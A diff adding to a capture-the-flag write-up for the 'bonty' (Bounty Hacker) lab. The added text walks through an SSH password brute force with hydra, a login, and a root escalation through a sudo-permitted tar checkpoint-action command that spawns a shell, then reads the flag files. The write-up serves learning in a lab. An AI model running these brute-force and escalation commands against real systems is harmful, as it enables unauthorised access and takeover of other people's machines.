@@ -78,6 +78,12 @@
    ```bash
    hydra -l lin -P locks.txt ssh://<IP>
    ```
+   ![bonty hydra](https://user-images.githubusercontent.com/112984045/200182851-8e096ab3-b256-47d3-aa9b-8825637ee755.png)
+   <br> ~ Now we can login to ssh using these credentials.
+   ![bonty 5](https://user-images.githubusercontent.com/112984045/200183044-0a8e07d5-d71c-4232-be91-ef66868be99c.png)
+
+ 
+   
    <br>
    
    * After logging in to ssh we can look for file contents and read them using the same commands :
@@ -87,7 +93,36 @@
    ```bash
    cat user.txt
    ```
+   ![bonty 5](https://user-images.githubusercontent.com/112984045/200183130-ea0fc571-676e-47bc-9790-122cbc2be4fb.png)
+<br>
    
+   ## PRIVILEGE ESCALATION :
+  * To check the root level access on command or authority to read, write, execute on files, we use command :
+  ```bash
+  sudo -l
+  ```
+   <br> ~ we can observe that user lin can run the commad tar as sudo.
+   
+  <br>
+  
+  ` * We can look in [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) for a command to escalate.`
+  ![bonty gtfbins tar](https://user-images.githubusercontent.com/112984045/200183946-d92a93da-2afa-4d22-9c5f-9a8259c89517.png)
+<br>
+
+* Finally we can run the command :
+```bash
+sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+<br> ~ congo you are in.
+
+* Now change directory to /root and read the flag using the commands :
+```bash
+cd /root
+```
+```bash
+cat root.txt
+```
+
    
    
    
